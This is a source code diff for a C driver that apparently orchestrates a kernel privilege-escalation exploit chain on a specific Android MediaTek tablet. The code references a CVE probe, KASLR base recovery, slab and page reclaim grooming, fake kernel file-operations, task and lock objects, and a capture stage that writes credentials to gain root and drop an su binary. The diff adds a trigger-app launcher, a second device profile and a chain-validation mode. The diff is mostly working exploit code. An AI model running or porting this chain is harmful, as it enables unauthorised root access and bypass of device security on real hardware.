@@ -22,11 +22,17 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "profile.h"
+
 #define REMOTE_TARGET  "/data/local/tmp/ionstack_perf_target"
 #define REMOTE_PRELOAD "/data/local/tmp/ionstack_preload.so"
 #define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
+#define REMOTE_RUNNER  "/data/local/tmp/ionstack_reroot_device"
 #define REMOTE_SU      "/data/local/tmp/su"
 #define REMOTE_SOCKET  "/data/local/tmp/temp_su.sock"
+
+#define TRIGGER_APP_PACKAGE "com.ionstack.trigger"
+#define TRIGGER_APP_ACTIVITY "com.ionstack.trigger/.MainActivity"
 
 #define HELPER_ATTEMPTS 6
 #define HELPER_TIMEOUT_MS 300000U
@@ -40,15 +46,6 @@
  * the transient fops capture stage.
  */
 #define CAPTURE_WORKERS 3U
-
-#define EXPECTED_DEVICE "ls12_mt8797_wifi_64"
-#define EXPECTED_KERNEL_RELEASE "4.19.191"
-#define EXPECTED_KERNEL_VERSION \
-  "#1 SMP PREEMPT Mon Jun 29 04:08:29 CST 2026"
-#define EXPECTED_SDK "33"
-#define EXPECTED_FINGERPRINT \
-  "alps/vnd_ls12_mt8797_wifi_64/ls12_mt8797_wifi_64:13/" \
-  "TP1A.220624.014/260:user/release-keys"
 
 struct env_pair {
   const char *name;
@@ -390,6 +387,102 @@ static int run_capture_command(const char *path, char *const argv[],
   return child_exit_code(&child);
 }
 
+static int run_trigger_app_command(char *const argv[], char *output,
+                                   size_t output_size,
+                                   unsigned timeout_ms) {
+  int rc = run_capture_command(argv[0], argv, output, output_size, timeout_ms);
+  if (rc != 0 && output[0] != '\0') {
+    fprintf(stderr, "[app-probe] command failed rc=%d output=%s", rc, output);
+    if (!strchr(output, '\n')) {
+      fputc('\n', stderr);
+    }
+  }
+  return rc;
+}
+
+static void print_trigger_app_log(void) {
+  char output[65536];
+  char *argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
+                  "/system/bin/cat", "files/probe.log", NULL};
+  int rc = run_capture_command(argv[0], argv, output, sizeof(output), 3000);
+  if (output[0] != '\0') {
+    printf("%s", output);
+    if (!strchr(output, '\n') || output[strlen(output) - 1] != '\n') {
+      fputc('\n', stdout);
+    }
+  }
+  if (rc != 0) {
+    fprintf(stderr, "[app-probe] cannot read probe log rc=%d\n", rc);
+  }
+}
+
+static void force_stop_trigger_app(void) {
+  char output[4096];
+  char *argv[] = {"/system/bin/am", "force-stop",
+                  (char *)TRIGGER_APP_PACKAGE, NULL};
+  run_capture_command(argv[0], argv, output, sizeof(output), 3000);
+}
+
+static int launch_trigger_app(const char *tree_arg, const char *task_arg,
+                              const char *lock_arg) {
+  if (strncmp(tree_arg, "--ashmem-tree-parent=", 21) != 0 ||
+      strncmp(task_arg, "--ashmem-task=", 14) != 0 ||
+      strncmp(lock_arg, "--ashmem-lock=", 14) != 0) {
+    fprintf(stderr, "[app-probe] invalid launcher arguments\n");
+    return 2;
+  }
+
+  char output[8192];
+  force_stop_trigger_app();
+  char *remove_argv[] = {
+      "/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE, "/system/bin/rm",
+      "-f", "files/probe.log", "files/probe.done", NULL,
+  };
+  if (run_trigger_app_command(remove_argv, output, sizeof(output), 3000) != 0) {
+    return 125;
+  }
+
+  char *start_argv[] = {
+      "/system/bin/am", "start", "-W", "-n", (char *)TRIGGER_APP_ACTIVITY,
+      "--es", "tree_arg", (char *)tree_arg,
+      "--es", "task_arg", (char *)task_arg,
+      "--es", "lock_arg", (char *)lock_arg,
+      NULL,
+  };
+  if (run_trigger_app_command(start_argv, output, sizeof(output), 10000) != 0) {
+    force_stop_trigger_app();
+    return 125;
+  }
+  printf("[app-probe] activity started tree=%s task=%s lock=%s\n",
+         tree_arg, task_arg, lock_arg);
+
+  uint64_t deadline = monotonic_ms() + 30000U;
+  while (!stop_requested && monotonic_ms() < deadline) {
+    char done[128];
+    char *done_argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
+                         "/system/bin/cat", "files/probe.done", NULL};
+    int rc = run_capture_command(done_argv[0], done_argv, done, sizeof(done),
+                                 1000);
+    if (rc == 0) {
+      char *end = NULL;
+      errno = 0;
+      long probe_rc = strtol(done, &end, 10);
+      if (errno == 0 && end != done && probe_rc >= 0 && probe_rc <= 255) {
+        print_trigger_app_log();
+        force_stop_trigger_app();
+        printf("[app-probe] completed rc=%ld\n", probe_rc);
+        return (int)probe_rc;
+      }
+    }
+    sleep_ms(100);
+  }
+
+  print_trigger_app_log();
+  force_stop_trigger_app();
+  fprintf(stderr, "[app-probe] timed out waiting for result\n");
+  return 124;
+}
+
 static int existing_root_works(void) {
   if (access(REMOTE_SU, X_OK) != 0) {
     return 0;
@@ -480,7 +573,15 @@ static void helper_line(const char *line, void *opaque) {
                "reclaim-order-gate sends=%u order3_success=%u "
                "order3_fail=%u accepted=%d",
                &sends, &success, &fail, &accepted) == 4) {
-      state->order_ok = accepted == 1 && sends > 0 && success == sends &&
+      /*
+       * The tracepoint counter also observes order-3 allocations performed by
+       * this holder outside the send loop.  The payload's own gate is the
+       * authoritative invariant: at least one successful allocation, no
+       * failed order-3 allocation, and an accepted reclaim result.  Requiring
+       * success == sends rejects exact-PFN/content-validated holders whenever
+       * those auxiliary allocations are present.
+       */
+      state->order_ok = accepted == 1 && sends > 0 && success > 0 &&
                         fail == 0;
     }
   }
@@ -543,15 +644,27 @@ static void helper_line(const char *line, void *opaque) {
 static void capture_line(const char *line, void *opaque) {
   struct capture_state *state = opaque;
   const char *result = strstr(line, "stage-fops-write-root-result ");
+  if (result) {
+    state->saw_result = 1;
+    state->ok = line_value_is_one(result, "ok=");
+    state->su_ready = line_value_is_one(result, "su_ready=");
+    const char *restore = strstr(result, " restore=");
+    if (restore) {
+      unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
+      state->restore_ok = value == 8;
+    }
+    return;
+  }
+
+  result = strstr(line, "stage-fops-check-result ");
   if (!result) {
     return;
   }
   state->saw_result = 1;
   state->ok = line_value_is_one(result, "ok=");
-  state->su_ready = line_value_is_one(result, "su_ready=");
-  const char *restore = strstr(result, " restore=");
+  const char *restore = strstr(result, " restore_ret=");
   if (restore) {
-    unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
+    long value = strtol(restore + strlen(" restore_ret="), NULL, 0);
     state->restore_ok = value == 8;
   }
 }
@@ -572,19 +685,30 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
   char posttarget_sends_value[32];
   snprintf(base_value, sizeof(base_value), "0x%016" PRIx64, kaslr_base);
   snprintf(hold_value, sizeof(hold_value), "%u", hold_sec);
+#if defined(IONSTACK_PROFILE_XPAD3S)
+  snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
+           8U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
+#else
   snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
            18U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
+#endif
   snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%u",
            8192U + (attempt > 1 ? (attempt - 1U) * 1024U : 0U));
   struct env_pair environment[] = {
       {"IONSTACK_KASLR_BASE", base_value},
       {"IONSTACK_KS_COLLISIONS", "8"},
       {"IONSTACK_KS_THREADS", "8"},
+#if defined(IONSTACK_PROFILE_XPAD3S)
+      {"IONSTACK_RECLAIM_PREPARE_SLABS", "12"},
+#endif
       {"IONSTACK_RECLAIM_CORE", "1"},
       {"IONSTACK_RECLAIM_PARTIAL_SLABS", partial_slabs_value},
       {"IONSTACK_RECLAIM_SPLICE_ORDER_GATE", "1"},
       {"IONSTACK_RECLAIM_REQUIRE_ORDER3", "1"},
       {"IONSTACK_RECLAIM_PFN_IDENTITY", "1"},
+#if defined(IONSTACK_PROFILE_XPAD3S)
+      {"IONSTACK_RECLAIM_PHYS_PFN_END", "0x240000"},
+#endif
       {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
       {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
       {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
@@ -614,7 +738,7 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
 static int spawn_capture(struct child_proc *child, unsigned worker,
                          const struct target_state *target,
                          const struct helper_state *helper,
-                         uint64_t linear_map_base) {
+                         uint64_t linear_map_base, int check_only) {
   char kaslr_value[32];
   char cred_value[32];
   char fops_value[32];
@@ -626,7 +750,7 @@ static int spawn_capture(struct child_proc *child, unsigned worker,
            helper->fake_fops);
   snprintf(linear_value, sizeof(linear_value), "0x%016" PRIx64,
            linear_map_base);
-  struct env_pair environment[] = {
+  struct env_pair root_environment[] = {
       {"IONSTACK_STAGE", "fops-write-root"},
       {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
       {"IONSTACK_FOPS_ROOT_ROUTE", "cred-writeonly"},
@@ -638,9 +762,24 @@ static int spawn_capture(struct child_proc *child, unsigned worker,
       {"IONSTACK_KASLR_BASE", kaslr_value},
       {"LD_PRELOAD", REMOTE_PRELOAD},
   };
+  struct env_pair check_environment[] = {
+      {"IONSTACK_STAGE", "fops-check"},
+      {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
+      {"IONSTACK_FOPS_CHECK_ATTEMPTS", "10000000"},
+      {"IONSTACK_FOPS_CHECK_RETRY_US", "0"},
+      {"IONSTACK_FOPS_CHECK_RESTORE", "1"},
+      {"IONSTACK_LINEAR_MAP_BASE", linear_value},
+      {"IONSTACK_KASLR_BASE", kaslr_value},
+      {"LD_PRELOAD", REMOTE_PRELOAD},
+  };
   char *argv[] = {"/system/bin/toybox", "true", NULL};
+  const struct env_pair *environment =
+      check_only ? check_environment : root_environment;
+  size_t environment_count =
+      check_only ? sizeof(check_environment) / sizeof(check_environment[0])
+                 : sizeof(root_environment) / sizeof(root_environment[0]);
   int rc = spawn_child(child, argv[0], argv, environment,
-                       sizeof(environment) / sizeof(environment[0]));
+                       environment_count);
   if (rc == 0) {
     static const int cpus[CAPTURE_WORKERS] = {0, 3, 6};
     cpu_set_t set;
@@ -656,7 +795,23 @@ static int spawn_capture(struct child_proc *child, unsigned worker,
 }
 
 static int spawn_probe(struct child_proc *child,
+                       const struct target_state *target,
                        const struct helper_state *helper) {
+#if defined(IONSTACK_PROFILE_XPAD3S)
+  char tree_arg[64];
+  char task_arg[64];
+  char lock_arg[64];
+  uint64_t init_task = target->kaslr_base + IONSTACK_INIT_TASK_OFF;
+  snprintf(tree_arg, sizeof(tree_arg),
+           "--ashmem-tree-parent=0x%016" PRIx64, helper->fake_w0);
+  snprintf(task_arg, sizeof(task_arg), "--ashmem-task=0x%016" PRIx64,
+           init_task);
+  snprintf(lock_arg, sizeof(lock_arg), "--ashmem-lock=0x%016" PRIx64,
+           helper->fake_lock);
+  char *argv[] = {(char *)REMOTE_RUNNER, "--app-probe-launch", tree_arg,
+                  task_arg, lock_arg, NULL};
+#else
+  (void)target;
   char task_arg[64];
   char lock_arg[64];
   snprintf(task_arg, sizeof(task_arg), "--io-submit-task=0x%016" PRIx64,
@@ -680,7 +835,12 @@ static int spawn_probe(struct child_proc *child,
       "--idle-ms=100",
       NULL,
   };
+#endif
+#if defined(IONSTACK_PROFILE_XPAD3S)
+  return spawn_child(child, REMOTE_RUNNER, argv, NULL, 0);
+#else
   return spawn_child(child, REMOTE_PROBE, argv, NULL, 0);
+#endif
 }
 
 static int wait_captures_and_probe(struct child_proc *captures,
@@ -765,27 +925,42 @@ static int target_profile_matches(void) {
   int device_ok = strcmp(device, EXPECTED_DEVICE) == 0;
   int sdk_ok = strcmp(sdk, EXPECTED_SDK) == 0;
   int version_ok = strcmp(uts.version, EXPECTED_KERNEL_VERSION) == 0;
-  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0;
-  printf("[reroot] PROFILE machine=%s release=%s device=%s sdk=%s "
+  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0 ||
+      (EXPECTED_FINGERPRINT_ALT[0] != '\0' &&
+       strcmp(fingerprint, EXPECTED_FINGERPRINT_ALT) == 0);
+  printf("[reroot] PROFILE name=%s machine=%s release=%s device=%s sdk=%s "
          "release_ok=%d version_ok=%d device_ok=%d sdk_ok=%d "
          "fingerprint_ok=%d\n",
-         uts.machine, uts.release, device, sdk, release_ok, version_ok,
+         IONSTACK_PROFILE_NAME, uts.machine, uts.release, device, sdk,
+         release_ok, version_ok,
          device_ok, sdk_ok, fingerprint_ok);
   return strcmp(uts.machine, "aarch64") == 0 && release_ok && device_ok &&
          sdk_ok && version_ok && fingerprint_ok;
 }
 
 int main(int argc, char **argv) {
+  if (argc == 5 && strcmp(argv[1], "--app-probe-launch") == 0) {
+    setvbuf(stdout, NULL, _IOLBF, 0);
+    setvbuf(stderr, NULL, _IOLBF, 0);
+    signal(SIGINT, on_signal);
+    signal(SIGTERM, on_signal);
+    signal(SIGHUP, on_signal);
+    return launch_trigger_app(argv[2], argv[3], argv[4]);
+  }
+
   unsigned target_hold_sec = 900;
   unsigned page_hold_sec = 240;
   int force = 0;
   int validate_only = 0;
+  int chain_validate_only = 0;
   int preflight_only = 0;
   for (int i = 1; i < argc; ++i) {
     if (strcmp(argv[i], "--force") == 0) {
       force = 1;
     } else if (strcmp(argv[i], "--validate-only") == 0) {
       validate_only = 1;
+    } else if (strcmp(argv[i], "--chain-validate-only") == 0) {
+      chain_validate_only = 1;
     } else if (strcmp(argv[i], "--preflight-only") == 0) {
       preflight_only = 1;
     } else if (strncmp(argv[i], "--target-hold-sec=", 18) == 0) {
@@ -794,6 +969,7 @@ int main(int argc, char **argv) {
       page_hold_sec = (unsigned)strtoul(argv[i] + 16, NULL, 0);
     } else if (strcmp(argv[i], "--help") == 0) {
       printf("usage: %s [--force] [--preflight-only] [--validate-only] "
+             "[--chain-validate-only] "
              "[--target-hold-sec=N] "
              "[--page-hold-sec=N]\n",
              argv[0]);
@@ -805,6 +981,11 @@ int main(int argc, char **argv) {
   }
   if (target_hold_sec < 60 || page_hold_sec < 60) {
     fprintf(stderr, "[reroot] hold times must be at least 60 seconds\n");
+    return 2;
+  }
+  if ((validate_only && chain_validate_only) ||
+      (preflight_only && (validate_only || chain_validate_only))) {
+    fprintf(stderr, "[reroot] validation modes are mutually exclusive\n");
     return 2;
   }
 
@@ -819,12 +1000,10 @@ int main(int argc, char **argv) {
   printf("[reroot] START boot_id=%s pid=%d uid=%d gid=%d pure_c=1\n", boot_id,
          getpid(), getuid(), getgid());
 
-  if (!force && !preflight_only && !validate_only && existing_root_works()) {
+  if (!force && !preflight_only && !validate_only && !chain_validate_only &&
+      existing_root_works()) {
     printf("[reroot] SUCCESS already_root=1 boot_id=%s\n", boot_id);
     return 0;
-  }
-  if (!all_required_files_present()) {
-    return 1;
   }
   if (!target_profile_matches()) {
     fprintf(stderr, "[reroot] refusing unsupported kernel/device profile\n");
@@ -833,6 +1012,25 @@ int main(int argc, char **argv) {
   if (preflight_only) {
     printf("[reroot] PREFLIGHT_OK boot_id=%s\n", boot_id);
     return 0;
+  }
+#if !IONSTACK_PROFILE_VALIDATE_ENABLED
+  fprintf(stderr,
+          "[reroot] refusing validate/full run: profile %s has no enabled "
+          "validation path\n",
+          IONSTACK_PROFILE_NAME);
+  return 1;
+#endif
+#if !IONSTACK_PROFILE_CHAIN_VALIDATED
+  if (!validate_only && !chain_validate_only) {
+    fprintf(stderr,
+            "[reroot] refusing full run: profile %s has not passed dynamic "
+            "chain validation yet\n",
+            IONSTACK_PROFILE_NAME);
+    return 1;
+  }
+#endif
+  if (!all_required_files_present()) {
+    return 1;
   }
 
   struct child_proc target;
@@ -888,6 +1086,8 @@ int main(int argc, char **argv) {
         helper_state.hold_ready &&
         helper_state.fake_lock >= helper_state.hold_base &&
         helper_state.fake_lock < helper_state.hold_base + UINT64_C(0x8000) &&
+        helper_state.fake_w0 >= helper_state.hold_base &&
+        helper_state.fake_w0 < helper_state.hold_base + UINT64_C(0x8000) &&
         helper_state.fake_task >= helper_state.hold_base &&
         helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
         helper_state.fake_fops >= helper_state.hold_base &&
@@ -907,7 +1107,11 @@ int main(int argc, char **argv) {
             helper_state.content_ok, helper_state.hold_ready,
             fresh_base_ok, layout_ok,
             helper_state.fresh_matches, helper_state.fresh_wanted,
+#if defined(IONSTACK_PROFILE_XPAD3S)
+            8U + attempt * 2U, 8192U + attempt * 1024U);
+#else
             18U + attempt * 2U, 8192U + attempt * 1024U);
+#endif
     stop_child(&holder);
     child_init(&holder);
   }
@@ -930,10 +1134,11 @@ int main(int argc, char **argv) {
   }
   printf("[reroot] HOLDER_OK base=0x%016" PRIx64
          " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
+         " fake_w0=0x%016" PRIx64
          " fake_fops=0x%016" PRIx64 " target_pfn=0x%" PRIx64
          " linear_map_base=0x%016" PRIx64 "\n",
          helper_state.hold_base, helper_state.fake_task,
-         helper_state.fake_lock, helper_state.fake_fops,
+         helper_state.fake_lock, helper_state.fake_w0, helper_state.fake_fops,
          helper_state.target_pfn, linear_map_base);
 
   if (validate_only) {
@@ -949,15 +1154,16 @@ int main(int argc, char **argv) {
   memset(capture_states, 0, sizeof(capture_states));
   for (unsigned i = 0; i < CAPTURE_WORKERS; ++i) {
     if (spawn_capture(&captures[i], i, &target_state, &helper_state,
-                      linear_map_base) != 0) {
+                      linear_map_base, chain_validate_only) != 0) {
       perror("[reroot] spawn capture worker");
       goto cleanup;
     }
-    printf("[reroot] CAPTURE_WORKER index=%u pid=%d\n", i,
-           captures[i].pid);
+    printf("[reroot] CAPTURE_WORKER index=%u pid=%d mode=%s\n", i,
+           captures[i].pid,
+           chain_validate_only ? "check-restore" : "cred-writeonly");
   }
   sleep_ms(500);
-  if (spawn_probe(&probe, &helper_state) != 0) {
+  if (spawn_probe(&probe, &target_state, &helper_state) != 0) {
     perror("[reroot] spawn probe");
     goto cleanup;
   }
@@ -987,7 +1193,33 @@ int main(int argc, char **argv) {
          CAPTURE_WORKERS, capture_results, capture_successes,
          capture_su_ready, probe_rc);
   if (probe_rc != 0 || capture_successes == 0) {
-    fprintf(stderr, "[reroot] write-only root capture failed\n");
+    fprintf(stderr, "[reroot] %s capture failed\n",
+            chain_validate_only ? "check-and-restore" : "write-only root");
+    goto cleanup;
+  }
+
+  if (chain_validate_only) {
+    char enforce[32] = {0};
+    char current_boot_id[128] = "unknown";
+    int enforce_ok = read_first_line("/sys/fs/selinux/enforce", enforce,
+                                     sizeof(enforce)) == 0 &&
+                     strcmp(enforce, "1") == 0;
+    int boot_ok = read_first_line("/proc/sys/kernel/random/boot_id",
+                                  current_boot_id,
+                                  sizeof(current_boot_id)) == 0 &&
+                  strcmp(current_boot_id, boot_id) == 0;
+    if (!enforce_ok || !boot_ok) {
+      fprintf(stderr,
+              "[reroot] chain validation postcondition failed "
+              "enforce=%s boot_id=%s\n",
+              enforce, current_boot_id);
+      goto cleanup;
+    }
+    printf("[reroot] CHAIN_VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
+           " fake_fops=0x%016" PRIx64 " restores=%u enforce=%s\n",
+           boot_id, target_state.kaslr_base, helper_state.fake_fops,
+           capture_successes, enforce);
+    result = 0;
     goto cleanup;
   }
 
